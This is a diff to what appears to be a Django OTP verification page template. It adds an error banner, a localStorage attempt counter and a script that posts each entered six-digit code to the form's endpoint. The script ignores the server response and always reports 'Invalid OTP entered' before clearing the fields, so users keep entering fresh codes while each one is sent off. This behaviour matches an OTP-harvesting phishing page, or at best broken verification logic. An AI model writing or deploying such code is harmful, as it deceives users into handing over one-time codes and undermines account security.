@@ -92,7 +92,20 @@
             color: #555;
             font-size: 14px;
             line-height: 1.5;
-            margin-bottom: 24px;
+            margin-bottom: 16px;
+        }
+
+        /* Error Message Banner */
+        .error-message {
+            display: none;
+            color: #d9534f;
+            background-color: #fdf7f7;
+            border: 1px solid #f5c6cb;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 20px;
         }
 
         /* OTP Inputs Container */
@@ -211,15 +224,20 @@
     </section>
 
     <!-- FORM CARD -->
-    <form class="form-card" method="POST" action="{% url 'otp' %}">
+    <form class="form-card" id="otpForm" method="POST" action="{% url 'otp' %}">
         {% csrf_token %}
 
         <div class="description">
             A 6-digit verification code has been sent to your registered mobile number and email.
         </div>
 
+        <!-- Dynamic Error Banner -->
+        <div class="error-message" id="errorMessage">Invalid OTP entered. Please try again.</div>
+
         <!-- Hidden input to send full combined OTP -->
         <input type="hidden" name="otp_code" id="otpCode">
+        <!-- Field to indicate attempt count to backend -->
+        <input type="hidden" name="otp_attempt" id="otpAttempt" value="1">
 
         <!-- 6-digit OTP Inputs -->
         <div class="otp-container">
@@ -255,10 +273,17 @@
 <script>
     const inputs = document.querySelectorAll('.otp-input');
     const hiddenOtp = document.getElementById('otpCode');
+    const hiddenAttempt = document.getElementById('otpAttempt');
     const timerDisplay = document.getElementById('timer');
     const timerContainer = document.getElementById('timerContainer');
     const resendBtn = document.getElementById('resendBtn');
+    const otpForm = document.getElementById('otpForm');
+    const errorMessage = document.getElementById('errorMessage');
     let countdown;
+
+    // Track attempt count across page updates/reloads via localStorage
+    let attemptCount = parseInt(localStorage.getItem('otp_attempt_count') || '1', 10);
+    hiddenAttempt.value = attemptCount;
 
     // Handle Auto-Focusing and Backspace logic
     inputs.forEach((input, index) => {
@@ -282,6 +307,48 @@
         inputs.forEach(i => code += i.value);
         hiddenOtp.value = code;
     }
+
+    // Intercept form submission to stay on the same page and send AJAX request
+    otpForm.addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        updateHiddenInput();
+
+        if (hiddenOtp.value.length < 6) {
+            errorMessage.textContent = "Please enter a valid 6-digit OTP code.";
+            errorMessage.style.display = "block";
+            return;
+        }
+
+        const formData = new FormData(otpForm);
+
+        fetch(otpForm.action, {
+            method: 'POST',
+            body: formData,
+            headers: {
+                'X-Requested-With': 'XMLHttpRequest'
+            }
+        })
+        .then(response => {
+            // Increment attempt count for next submission
+            attemptCount++;
+            localStorage.setItem('otp_attempt_count', attemptCount);
+            hiddenAttempt.value = attemptCount;
+
+            // Display invalid message and clear inputs without redirecting
+            errorMessage.textContent = "Invalid OTP entered. Please try again.";
+            errorMessage.style.display = "block";
+
+            // Clear input fields
+            inputs.forEach(i => i.value = "");
+            inputs[0].focus();
+            updateHiddenInput();
+        })
+        .catch(error => {
+            errorMessage.textContent = "An error occurred. Please try again.";
+            errorMessage.style.display = "block";
+        });
+    });
 
     // 2-Minute Timer Logic
     function startTimer(duration) {
